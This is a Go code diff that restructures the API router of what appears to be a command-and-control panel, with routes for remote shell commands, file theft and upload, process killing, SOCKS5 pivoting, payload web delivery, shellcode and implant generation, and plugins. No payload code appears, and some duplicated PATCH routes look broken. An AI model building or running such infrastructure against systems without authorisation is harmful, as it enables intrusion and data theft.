@@ -16,7 +16,6 @@ import (
 func NewRouter(embedFS embed.FS, staticFs fs.FS) *gin.Engine {
 	gin.SetMode(gin.ReleaseMode)
 	r := gin.New()
-	//r := gin.Default()
 
 	// 配置 CORS
 	r.Use(middlewares.Cors())
@@ -47,13 +46,13 @@ func NewRouter(embedFS embed.FS, staticFs fs.FS) *gin.Engine {
 		c.HTML(http.StatusOK, "index.html", nil)
 	})
 
-	// API路由组 - 不需要Basic认证
-	a := r.Group("/api")
+	// API v1 路由组
+	a := r.Group("/api/v1")
 	{
-		// 登录接口 - 不需要任何认证
-		a.POST("/users/login", api.LoginHandler)
+		// 认证接口 - 不需要任何认证
+		a.POST("/auth/login", api.LoginHandler)
 
-		// WebSocket连接端点 - 不需要Basic认证，会在处理器中验证JWT token
+		// WebSocket连接端点 - 不需要JWT，会在处理器中验证WebSocket专用token
 		a.GET("/ws/interactive/:uid/:sessionId", api.InteractiveShell)
 	}
 
@@ -61,94 +60,104 @@ func NewRouter(embedFS embed.FS, staticFs fs.FS) *gin.Engine {
 	protected := a.Group("/")
 	protected.Use(middlewares.AuthMiddleware())
 
-	users := protected.Group("/users")
+	// 认证相关（已登录用户）
+	auth := protected.Group("/auth")
 	{
-		// 注销
-		users.POST("/logout", api.LogoutHandler)
-
-		// 修改密码
-		users.POST("/user_setting/ChangePassword", api.ChangePasswordHandler)
+		auth.POST("/logout", api.LogoutHandler)
+		auth.PUT("/password", api.ChangePasswordHandler)
 	}
 
-	clients := protected.Group("/client")
+	// 客户端管理
+	clients := protected.Group("/clients")
 	{
-		clients.GET("/clientslist", api.GetClients)
-		clients.POST("/shell/sendcommand", api.SendCommands)
-		clients.GET("/shell/getshellcontent", api.GetShellContent)
-		clients.GET("/pid", api.GetPidList)
-		clients.POST("/pid/kill", api.KillPid)
-		clients.POST("/file/tree", api.FileBrowse)
-		clients.POST("/file/delete", api.FileDelete)
-		clients.POST("/file/mkdir", api.MakeDir)
-		clients.POST("/file/upload", api.FileUpload)
-		clients.GET("/note/get", api.GetNote)
-		clients.POST("/note/save", api.SaveNote)
-		clients.POST("/file/download", api.DownloadFile)
-		clients.GET("/downloads/info", api.GetDownloadsInfo)
-		clients.POST("/downloads/downloaded_file", api.DownloadDownloadedFile)
-		clients.GET("/file/drives", api.ListDrives)
-		clients.POST("/file/filecontent", api.FetchFileContent)
-		clients.GET("/exit", api.ExitClient)
-		clients.POST("/addnote", api.AddUidNote)
-		clients.POST("/sleep", api.EditSleep)
-		clients.POST("/color", api.EditColor)
-		clients.POST("/GenServer", api.GenServer)
-		clients.GET("/listener/list", api.ShowListener)
+		clients.GET("", api.GetClients)
+		clients.POST("/:uid/shell/commands", api.SendCommands)
+		clients.GET("/:uid/shell/output", api.GetShellContent)
+		clients.GET("/:uid/processes", api.GetPidList)
+		clients.DELETE("/:uid/processes/:pid", api.KillPid)
+		clients.GET("/:uid/files", api.FileBrowse)
+		clients.DELETE("/:uid/files", api.FileDelete)
+		clients.POST("/:uid/files/directories", api.MakeDir)
+		clients.POST("/:uid/files/upload", api.FileUpload)
+		clients.GET("/:uid/note", api.GetNote)
+		clients.PUT("/:uid/note", api.SaveNote)
+		clients.POST("/:uid/files/download", api.DownloadFile)
+		clients.GET("/:uid/downloads", api.GetDownloadsInfo)
+		clients.POST("/:uid/downloads/fetch", api.DownloadDownloadedFile)
+		clients.GET("/:uid/drives", api.ListDrives)
+		clients.GET("/:uid/files/content", api.FetchFileContent)
+		clients.DELETE("/:uid", api.ExitClient)
+		clients.PUT("/:uid/sleep", api.EditSleep)
+		clients.PUT("/:uid/color", api.EditColor)
 	}
 
-	listeners := protected.Group("/listener")
+	// 生成器
+	generators := protected.Group("/generators")
 	{
-		listeners.POST("/add", api.AddListener)
-		listeners.GET("/list", api.ListListener)
-		listeners.POST("/open", api.OpenListener)
-		listeners.POST("/close", api.CloseListener)
-		listeners.POST("/delete", api.DeleteListener)
+		generators.POST("/servers", api.GenServer)
+		generators.GET("/listeners/active", api.ShowListener)
 	}
 
+	// 监听器管理
+	listeners := protected.Group("/listeners")
+	{
+		listeners.POST("", api.AddListener)
+		listeners.GET("", api.ListListener)
+		listeners.PATCH("/:addr/status", api.OpenListener)
+		listeners.PATCH("/:addr/status", api.CloseListener)
+		listeners.DELETE("/:addr", api.DeleteListener)
+	}
+
+	// WebDelivery 管理
 	webDelivery := protected.Group("/webdelivery")
 	{
-		webDelivery.GET("/list", api.ListWebDelivery)
-		webDelivery.POST("/start", api.StartWebDelivery)
-		webDelivery.POST("/close", api.CloseWebDelivery)
-		webDelivery.POST("/open", api.OpenWebDelivery)
-		webDelivery.POST("/delete", api.DeleteWebDelivery)
+		webDelivery.GET("", api.ListWebDelivery)
+		webDelivery.POST("", api.StartWebDelivery)
+		webDelivery.PATCH("/:port/status", api.CloseWebDelivery)
+		webDelivery.PATCH("/:port/status", api.OpenWebDelivery)
+		webDelivery.DELETE("/:port", api.DeleteWebDelivery)
 	}
 
-	socks5 := protected.Group("/socks5")
+	// SOCKS5 管理
+	socks5 := protected.Group("/clients/:uid/socks5")
 	{
-		socks5.GET("/list", api.Socks5List)
-		socks5.POST("/start", api.Socks5Start)
+		socks5.GET("", api.Socks5List)
+		socks5.POST("", api.Socks5Start)
 		socks5.POST("/open", api.Socks5Open)
 		socks5.POST("/close", api.Socks5Close)
 		socks5.POST("/delete", api.Socks5Delete)
 	}
 
+	// 设置
 	settings := protected.Group("/settings")
 	{
-		settings.GET("/list", api.ListSettings)
-		settings.POST("/edit", api.EditSettings)
+		settings.GET("", api.ListSettings)
+		settings.PUT("", api.EditSettings)
 	}
 
-	protected.POST("/bin/execute", api.ExecuteBin)
-	protected.POST("/bin/executelinuxscript", api.ExecuteLinuxScript)
+	// 二进制执行
+	protected.POST("/clients/:uid/bin/execute", api.ExecuteBin)
+	protected.POST("/clients/:uid/bin/executelinuxscript", api.ExecuteLinuxScript)
 
+	// Shellcode 生成
 	shellcode := protected.Group("/shellcode")
 	{
-		//shellcode.POST("/stageless", api.StageLessShellCodeGen)
 		shellcode.POST("/stage", api.StageShellCodeGen)
 	}
 
-	plugin := protected.Group("/plugin")
+	// 插件管理
+	plugin := protected.Group("/plugins")
 	{
-		plugin.GET("/list", api.ListPlugins)
-		plugin.POST("/add", api.AddPlugin)
-		plugin.POST("/delete", api.DeletePlugin)
-		plugin.POST("/execute", api.ExecutePlugin)
+		plugin.GET("", api.ListPlugins)
+		plugin.POST("", api.AddPlugin)
+		plugin.DELETE("/:id", api.DeletePlugin)
+		plugin.POST("/:id/execute", api.ExecutePlugin)
 	}
 
-	// WebSocket认证token获取端点 - 需要JWT认证
+	// WebSocket认证token获取端点
 	protected.GET("/ws/auth/:uid", api.GetWebSocketAuthToken)
 
+	// 转发连接
 	protected.POST("/forward-connection", api.ForwardConnect)
 
 	// MCP Endpoints (Protected by JWT AuthMiddleware)
